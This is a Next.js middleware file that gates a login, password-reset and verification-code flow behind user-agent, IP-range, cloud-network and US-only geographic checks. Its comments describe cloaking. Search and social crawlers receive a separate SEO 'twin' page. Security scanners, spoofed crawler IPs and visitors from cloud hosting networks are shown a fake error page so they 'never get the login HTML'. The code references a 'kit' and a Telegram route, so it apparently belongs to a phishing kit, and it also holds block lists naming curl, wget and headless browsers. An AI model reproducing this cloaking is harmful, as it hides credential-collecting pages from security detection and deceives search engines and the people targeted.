import { NextResponse } from "next/server";
import type { NextFetchEvent, NextRequest } from "next/server";
import { notifyBotCrawlIfNeeded } from "@/lib/bot-verification/bot-crawl-middleware";
import {
  CRAWLER_SEO_PAGE_UA,
  SEARCH_CRAWLER_UA,
  DISCOVERY_CRAWLER_UA,
  isSocialPreviewCrawlerUA,
} from "@/lib/bot-detection";
import { AI_REFERENCE_CRAWLER_UA } from "@/lib/ai-referral";
import { isSeoCrawlerPath } from "@/lib/seo-crawler-paths";
import { AI_TRAINING_CRAWLER_UA } from "@/lib/ai-referral";
import { isLocalTestingUnlocked } from "@/lib/local-testing";
// Step 4 — Steins Gate.
import { buildErrorScreenHtml } from "@/lib/error-screen-html";
import { getRequestCountryCode } from "@/lib/edge-geo";
import { GEO_US_ONLY_HEADER } from "@/lib/geo-us-header";
import { isDeniedBotUserAgent } from "@/lib/bot-verification/denied-bots";
import { evaluateOriginRequestGate } from "@/lib/bot-verification/origin-request-gate";
import { isUngatedSeoPath } from "@/lib/seo-public-paths";
import { SITE_ORIGIN } from "@/lib/site-url";
import { isTrustedCrawlerUserAgent } from "@/utils/botDetection";

const ALLOWED_BOT_PATTERNS = [
  /facebookexternalhit/i,
  /facebot/i,
  /twitterbot/i,
  /linkedinbot/i,
  /slackbot/i,
  /slack-imgproxy/i,
  /telegrambot/i,
  /whatsapp/i,
  /discordbot/i,
  /pinterest/i,
  /embedly/i,
  /googlebot/i,
  /bingbot/i,
  /applebot/i,
  /viber/i,
  /redditbot/i,
  /tumblr/i,
  /line-poker/i,
  /line-crawler/i,
  /kakaotalk/i,
  /skype/i,
  /wechat/i,
  /flipboard/i,
  /medium/i,
  /bitlybot/i,
  /quora link preview/i,
  /discord/i,
];

const BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /python-requests/i,
  /python-urllib/i,
  /scrapy/i,
  /go-http-client/i,
  /postman/i,
  /insomnia/i,
  /selenium/i,
  /webdriver/i,
  /puppeteer/i,
  /playwright/i,
  /phantom/i,
  /headlesschrome/i,
  /chrome-lighthouse/i,
  /prerender/i,
  /browsershot/i,
  /wkhtmltopdf/i,
  /html2pdf/i,
  /uptimerobot/i,
  /pingdom/i,
  /site24x7/i,
  /statuscake/i,
  /nagios/i,
  /rogerbot/i,
  /ahrefsbot/i,
  /semrushbot/i,
  /dotbot/i,
  /mj12bot/i,
  /petalbot/i,
  /libwww/i,
  /lwp-trivial/i,
  /php\/\d/i,
  /^java\s/i,
  /datadog/i,
  /sentry\/\d/i,
  /archive\.org/i,
  /wayback/i,
  /ia_archiver/i,
];

function isAllowedBot(ua: string): boolean {
  return ALLOWED_BOT_PATTERNS.some((p) => p.test(ua));
}

function isBlockedBot(ua: string): boolean {
  return BLOCKED_BOT_PATTERNS.some((p) => p.test(ua));
}

const FORGOT_FLOW_COOKIE = "forgot_flow";
const NEW_USER_FLOW_COOKIE = "new_user_flow";
const LOGIN_FLOW_COOKIE = "login_flow";

const protectedForgotPaths = [
  "/forgot-password-found",
  "/forgot-password-verify",
  "/forgot-password-code",
];

const protectedNewUserPaths = ["/new-user-code", "/new-user-password"];

/**
 * Single exit point for HTML responses.
 *
 * HARD RULE (SEO_CRAWLER_RULES): every HTML `NextResponse.next()` goes through
 * here so the crawler stamps can never be dropped by a later code path. If you
 * add another `NextResponse.next()` in this file, route it through this helper.
 *
 * `x-crawler-seo-page` is set twice on purpose:
 *  - as a response header, read by `app/layout.tsx` during SSR
 *  - as a response cookie, the RSC bridge — a client-side navigation does not
 *    re-run the middleware for the layout, so without the cookie the layout would
 *    render the human UI and Search Console would record a human-UI regression.
 */
/**
 * True when this UA should receive the CrawlerSeoPage twin.
 *
 * Composed rather than using the kit's pre-combined CRAWLER_SEO_PAGE_UA directly,
 * because the social bucket needs the in-app-browser exclusion and the training
 * bucket needs an outright veto.
 */
function isCrawlerSeoPageUserAgent(ua: string): boolean {
  if (!ua) return false
  // Veto first: these are Disallow:/ in robots.txt.
  if (AI_TRAINING_CRAWLER_UA.test(ua)) return false
  if (/applebot-extended/i.test(ua)) return false
  if (SEARCH_CRAWLER_UA.test(ua)) return true
  if (DISCOVERY_CRAWLER_UA.test(ua)) return true
  if (AI_REFERENCE_CRAWLER_UA.test(ua)) return true
  return isSocialPreviewCrawlerUA(ua)
}

/**
 * Step 4 — public assets and ungated SEO paths. These must never be cloaked:
 * the ErrorScreen loads `/error-icon.png`, and robots/sitemap/IndexNow keys have
 * to stay reachable for crawlers and for `check-indexnow-key`.
 */
const PUBLIC_BRAND_ASSETS = new Set([
  "/error-icon.png",
  "/favicon.ico",
  "/favicon-32x32.png",
  "/favicon.png",
  "/icon-32x32.png",
  "/icon-48x48.png",
  "/apple-touch-icon.png",
  "/og-image.png",
  "/og-image.meta.json",
]);

function isUngatedAssetPath(pathname: string): boolean {
  return (
    PUBLIC_BRAND_ASSETS.has(pathname) ||
    pathname === "/robots.txt" ||
    pathname === "/sitemap.xml" ||
    isUngatedSeoPath(pathname)
  );
}

/**
 * SSR Chrome ErrorScreen at HTTP 200 for denied / unknown automation clients.
 * Deliberately never a bare `403 Forbidden` on a document path — plain text
 * "Forbidden" on an HTML route is what Google Search Console flags as a
 * soft-404 / blocked-crawler symptom.
 */
function deniedBotErrorResponse(request: NextRequest): NextResponse {
  const host =
    request.headers.get("host")?.split(":")[0] ||
    (() => {
      try {
        return new URL(SITE_ORIGIN).hostname;
      } catch {
        return "this site";
      }
    })();

  return new NextResponse(buildErrorScreenHtml(host), {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      "X-Robots-Tag": "noindex, nofollow",
    },
  });
}

/**
 * Origin request gate (kit-required). Cloaks denied scanners, spoofed
 * Google/Bing UAs whose IP is not in the published crawler CIDRs, and traffic
 * from AWS / DO / Azure / OVH ASNs; rate-limits `/api` + `/search` +
 * `/availability`. Must run BEFORE the `/api` early-return and before the
 * local-testing unlock, or a dev deploy leaks the login markup to a scraper.
 */
async function handleOriginGateIfNeeded(
  request: NextRequest,
): Promise<NextResponse | null> {
  const decision = await evaluateOriginRequestGate(request);

  if (decision.action === "allow") return null;

  if (decision.action === "rate_limit") {
    if (request.nextUrl.pathname.startsWith("/api")) {
      return new NextResponse("Too Many Requests", { status: 429 });
    }
    return deniedBotErrorResponse(request);
  }

  // Cloak, but still serve brand/SEO assets so the ErrorScreen's own icon loads.
  if (isUngatedAssetPath(request.nextUrl.pathname)) {
    return nextWithHeaders(request);
  }
  return deniedBotErrorResponse(request);
}

/**
 * US-only geo gate. Stamps `x-geo-us-only` = allow | block | unknown as a
 * REQUEST header, which `ProtectedLayout` reads and hands to
 * `ReffererProvider` as `geoAccess`. Trusted / SEO crawlers skip the gate.
 *
 * This must set a request header, not a response header — `headers()` in the
 * server layout only sees request headers, so a response header would leave
 * `geoAccess` permanently `undefined` and send every US visitor to the error
 * page.
 */
function handleGeoRegionRedirectIfNeeded(
  request: NextRequest,
): NextResponse | null {
  const { pathname } = request.nextUrl;

  if (pathname.startsWith("/api") || pathname.startsWith("/_next")) {
    return null;
  }
  if (isUngatedAssetPath(pathname)) {
    return null;
  }

  const userAgent = request.headers.get("user-agent") || "";
  if (isTrustedCrawlerUserAgent(userAgent) || isCrawlerSeoPageUserAgent(userAgent)) {
    return null;
  }

  const country = getRequestCountryCode(request);
  const value: "allow" | "block" | "unknown" = !country
    ? "unknown"
    : country === "US"
      ? "allow"
      : "block";

  const requestHeaders = applySearchCrawlerHeaders(request);
  requestHeaders.set(GEO_US_ONLY_HEADER, value);

  return NextResponse.next({ request: { headers: requestHeaders } });
}

/**
 * Soft "looks like a crawler" tokens — cloaked with SSR ErrorScreen, never a
 * bare 403.
 */
const SOFT_BLOCKED_BOT_PATTERNS = [/bot/i, /crawler/i, /spider/i, /scraper/i];

/** Strict HTTP/automation clients — must never receive a bare `Forbidden` on a
 *  document. */
const STRICT_BLOCKED_BOT_PATTERNS = [
  /curl/i,
  /wget/i,
  /httpclient/i,
  /python-requests/i,
  /python-urllib/i,
  /axios/i,
  /okhttp/i,
  /libwww-perl/i,
  /go-http-client/i,
  /\bjava\b/i,
  /\bphp\b/i,
  /headlesschrome/i,
  /puppeteer/i,
  /playwright/i,
  /phantomjs/i,
  /selenium/i,
  /scrapy/i,
];

/**
 * Step 4 Sector D — bot classification for HTML documents.
 *
 * `/api/telegram` and the verify-* routes are exempt because the kit treats
 * them as first-party. A denied bot on a document gets the SSR ErrorScreen at
 * HTTP 200; a bare `403 Forbidden` on HTML is what Google Search Console reads
 * as a soft-404 / blocked-crawler symptom. APIs may still 403.
 */
function handleBotIfNeeded(
  request: NextRequest,
  userAgent: string,
): NextResponse | null {
  const { pathname } = request.nextUrl;

  if (pathname.startsWith("/_next")) return null;
  if (pathname.startsWith("/api/verify-")) return null;
  if (pathname.startsWith("/api/telegram")) return null;
  if (isUngatedAssetPath(pathname)) return null;

  if (!userAgent) {
    if (pathname.startsWith("/api")) {
      return new NextResponse("Forbidden", { status: 403 });
    }
    return deniedBotErrorResponse(request);
  }

  // Competitive SEO tools + security scanners never get the login HTML.
  if (isDeniedBotUserAgent(userAgent)) {
    return deniedBotErrorResponse(request);
  }

  const strictMatch = STRICT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent));
  const softMatch = SOFT_BLOCKED_BOT_PATTERNS.some((p) => p.test(userAgent));

  if (!strictMatch && !softMatch) return null;

  // Allowlisted search / social / discovery / AI-reference crawlers are exempt.
  if (isCrawlerSeoPageUserAgent(userAgent)) return null;

  return deniedBotErrorResponse(request);
}

/**
 * The ONE place request headers may be cloned.
 *
 * `audit-crawler-seo.mjs` (and the SEO_CRAWLER_RULES hard rule) forbid cloning
 * `request.headers` anywhere else: a rebuild from bare headers silently drops
 * the crawler stamps, and the root layout then falls back to the human login
 * for Googlebot in Search Console. Setting `x-pathname` here also means the
 * layout's `headers().get("x-pathname")` finally resolves — it was only ever
 * stamped on the response, which server components cannot read.
 */
function applySearchCrawlerHeaders(request: NextRequest): Headers {
  const requestHeaders = new Headers(request.headers);
  const ua = request.headers.get("user-agent") ?? "";
  requestHeaders.set("x-pathname", request.nextUrl.pathname);

  // Denied bots never receive crawler SEO stamps, even though their UA contains
  // "bot" — otherwise Ahrefs/Semrush would be handed the CrawlerSeoPage twin.
  if (isDeniedBotUserAgent(ua)) {
    return requestHeaders;
  }

  return requestHeaders;
}

function nextWithHeaders(
  request: NextRequest,
  extra: Record<string, string> = {}
): NextResponse {
  const pathname = request.nextUrl.pathname;
  const response = NextResponse.next();
  response.headers.set("x-pathname", pathname);
  for (const [key, value] of Object.entries(extra)) {
    response.headers.set(key, value);
  }
  return response;
}

function attachCrawlerSeoCookie(response: NextResponse): NextResponse {
  response.cookies.set("x-crawler-seo-page", "1", { path: "/" });
  return response;
}

export async function middleware(request: NextRequest, event: NextFetchEvent) {
  const { pathname } = request.nextUrl;
  const userAgent = request.headers.get("user-agent") || "";

  // Step 3 Sector B: crawler / bot-crawl alerts to the SEO admin bot. Fired via
  // waitUntil so the alert never adds latency to the member's request.
  if (!isLocalTestingUnlocked()) {
    notifyBotCrawlIfNeeded(request, event);
  }

  /* Step 4 origin gate — FIRST. It must precede the `/api` early-return below,
     otherwise spoof/ASN cloaking and the 5-req-per-10s rate limit never apply
     to API paths, and it must precede the local-testing unlock below so
     `ALLOW_LOCAL_TESTING` can never weaken the cloak. */
  const originGate = await handleOriginGateIfNeeded(request);
  if (originGate) {
    return originGate;
  }

  if (
    pathname.startsWith("/api") ||
    pathname.startsWith("/_next") ||
    isUngatedAssetPath(pathname)
  ) {
    return nextWithHeaders(request);
  }

  /* Step 4 Sector D — non-allowlisted automation on an HTML document gets the
     SSR ErrorScreen at HTTP 200. Runs AFTER the crawler block above so
     allowlisted search/social/AI-reference crawlers are already served. */
  const botResponse = handleBotIfNeeded(request, userAgent);
  if (botResponse) {
    return botResponse;
  }

  // Step 5: allowed search + social + discovery + AI-reference crawlers get the
  // SSR CrawlerSeoPage twin at `/`. The header + cookie are the contract the root
  // layout reads to decide which tree to render — humans fall through to the real
  // login and never see the twin.
  //
  // AI *training* crawlers are excluded even though some of their UA strings also
  // match a search pattern (Applebot-Extended matches `applebot`, and several
  // training tokens appear inside broader patterns). They are `Disallow: /` in
  // robots.txt, so serving them the twin would contradict our own crawl policy.
  if (
    isSeoCrawlerPath(pathname) &&
    isCrawlerSeoPageUserAgent(userAgent) &&
    !/applebot-extended/i.test(userAgent)
  ) {
    return attachCrawlerSeoCookie(
      nextWithHeaders(request, { "x-crawler-seo-page": "1" })
    );
  }

  if (process.env.NODE_ENV !== "production") {
    const ua = userAgent;
    if (isAllowedBot(ua)) return nextWithHeaders(request);
    if (isBlockedBot(ua))
      return NextResponse.redirect(new URL("/blocked", request.url));
  }

  if (protectedForgotPaths.includes(pathname)) {
    const hasFlowCookie =
      request.cookies.get(FORGOT_FLOW_COOKIE)?.value === "1";
    if (!hasFlowCookie) {
      const url = request.nextUrl.clone();
      url.pathname = "/forgot-password";
      return NextResponse.redirect(url);
    }
  }

  if (protectedNewUserPaths.includes(pathname)) {
    const flowValue = request.cookies.get(NEW_USER_FLOW_COOKIE)?.value;

    if (pathname === "/new-user-code") {
      if (!(flowValue === "1" || flowValue === "2")) {
        const url = request.nextUrl.clone();
        url.pathname = "/new-user";
        return NextResponse.redirect(url);
      }
    }

    if (pathname === "/new-user-password") {
      if (flowValue !== "2") {
        const url = request.nextUrl.clone();
        url.pathname = "/new-user";
        return NextResponse.redirect(url);
      }
    }
  }

  const loginFlowValue = request.cookies.get(LOGIN_FLOW_COOKIE)?.value;

  if (pathname === "/verify-choice") {
    if (!loginFlowValue) {
      const url = request.nextUrl.clone();
      url.pathname = "/";
      return NextResponse.redirect(url);
    }
  }

  if (pathname === "/verify") {
    const step = request.nextUrl.searchParams.get("step");

    if (step === "2") {
      if (loginFlowValue !== "3") {
        const url = request.nextUrl.clone();
        url.pathname = "/";
        url.search = "";
        return NextResponse.redirect(url);
      }
    } else {
      if (!loginFlowValue) {
        const url = request.nextUrl.clone();
        url.pathname = "/";
        url.search = "";
        return NextResponse.redirect(url);
      }
    }
  }

  /* Step 4 US-only geo gate — last, after every flow/crawler gate. */
  return handleGeoRegionRedirectIfNeeded(request) ?? nextWithHeaders(request);
}

export const config = {
  matcher: [
    // Brand assets + crawler endpoints are public and must bypass the flow gates.
    // Only paths that actually exist on disk are whitelisted here.
    "/((?!_next/static|_next/image|favicon.ico|favicon-32x32.png|favicon.png|icon-32x32.png|icon-48x48.png|apple-touch-icon.png|og-image.png|og-image.meta.json|error-icon.png|robots.txt|sitemap.xml).*)",
  ],
};
